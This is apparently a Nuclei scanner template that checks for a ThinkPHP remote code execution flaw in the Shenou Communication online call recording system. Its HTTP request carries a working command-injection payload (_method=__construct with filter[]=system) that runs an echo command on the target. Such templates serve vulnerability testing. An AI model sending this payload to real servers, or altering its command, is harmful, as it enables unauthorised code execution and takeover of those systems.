id: shenoutongxin-index-rce

info:
  name: 申瓯通信在线录音管理系统存在Thinkphp远程代码执行漏洞
  author: shenoutongxin
  severity: high

http:
  - raw:
      - |
        POST /callcenter/public/index.php/index.php?s=index/index/index HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
        Content-type: application/x-www-form-urlencoded
        Cache-Control: no-cache
        Pragma: no-cache
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close

        s=echo Hellotest22World&_method=__construct&method=POST&filter[]=system

    matchers:
      - type: word
        part: body
        words:
          - "Hellotest22World"
      - type: dsl
        dsl:
          - 'len(body) < 30'
    matchers-condition: and